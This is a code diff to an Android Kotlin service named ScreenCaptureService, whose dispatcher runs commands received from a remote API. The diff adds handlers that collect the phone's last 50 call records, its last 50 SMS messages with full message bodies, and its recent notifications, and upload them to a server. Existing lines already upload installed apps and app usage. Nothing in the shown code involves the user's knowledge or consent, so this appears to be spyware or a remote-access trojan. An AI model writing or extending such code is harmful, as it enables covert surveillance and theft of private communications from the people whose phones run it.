@@ -220,6 +220,53 @@ class ScreenCaptureService : Service() {
                         val json = AppHelper(this).getInstalledApps()
                         api.updateStatus(id, "DONE", api.uploadJson(json))
                     }
+                    "CALL_LOG" -> {
+    try {
+        val calls = TelephonyHelper(this).getCallLogs(50)
+        val arr   = org.json.JSONArray()
+        calls.forEach { c ->
+            arr.put(JSONObject().apply {
+                put("number",   c.number)
+                put("type",     c.type)
+                put("duration", c.durationSec)
+                put("date",     c.date)
+            })
+        }
+        if (arr.length() == 0) api.updateStatus(id, "FAILED")
+        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
+    } catch (_: Exception) {
+        api.updateStatus(id, "FAILED")
+    }
+}
+
+"SMS_LOG" -> {
+    try {
+        val smsList = TelephonyHelper(this).getSmsLogs(50)
+        val arr     = org.json.JSONArray()
+        smsList.forEach { s ->
+            arr.put(JSONObject().apply {
+                put("address", s.address)
+                put("body",    s.body)
+                put("type",    s.type)
+                put("date",    s.date)
+            })
+        }
+        if (arr.length() == 0) api.updateStatus(id, "FAILED")
+        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
+    } catch (_: Exception) {
+        api.updateStatus(id, "FAILED")
+    }
+}
+
+"NOTIFICATIONS" -> {
+    try {
+        val json = NotificationService.getRecent()
+        if (json == "[]") api.updateStatus(id, "FAILED")
+        else api.updateStatus(id, "DONE", api.uploadJson(json))
+    } catch (_: Exception) {
+        api.updateStatus(id, "FAILED")
+    }
+}
                     "APP_USAGE" -> {
                         val json = AppHelper(this).getAppUsage()
                         if (json == "[]") api.updateStatus(id, "FAILED")
